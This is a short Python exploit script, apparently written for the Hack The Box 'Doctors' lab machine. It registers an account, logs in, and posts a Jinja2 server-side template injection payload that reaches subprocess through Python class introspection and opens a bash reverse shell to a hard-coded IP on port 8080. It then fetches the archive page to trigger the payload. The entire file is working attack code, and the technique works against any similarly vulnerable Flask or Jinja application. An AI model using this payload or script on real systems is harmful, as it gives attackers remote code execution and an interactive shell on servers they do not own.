#!/usr/bin/python3

import sys
import requests

base_url = "http://doctors.htb/"
username = "test"
email = "test@test.com"
password = "test"

def register():
	register_url = base_url + 'register'
	params = {'username': username,'email':email,'password':password,'confirm_password':password,'submit':'Sign+Up'}
	result = requests.post(register_url,params)
	if "<span>" in result.text:
		print("BAD")
	else:
		print("User created")


#def create_post(payload):
def create_post(ip):
	login_url = base_url + 'login'
	params = {'email':email,'password':password,'submit':'Login'}
	with requests.Session() as r:
		result = r.post(login_url, params)
		if "Nope" not in result.text:
			payload = "{{{{ ''.__class__.__mro__[1].__subclasses__()[407](\"/bin/bash -c '/bin/bash -i >& /dev/tcp/{0}/8080 0>&1'\", shell=True).communicate() }}}}".format(ip)
			print(payload)
			params_payload = {'title':payload,'content':'content','submit':'Post'}
			post_url = base_url + "/post/new"
			result = r.post(post_url, params_payload)
			print("Payload injected")
	requests.get(base_url + "/archive")
	print("Shell")


if __name__ == "__main__":
#exploit
	register()
	create_post("10.10.14.183")
#	if len(sys.argv) == 2:
#		create_post(str(sys.argv[1]))
#	else:
#		print("Add payload string")
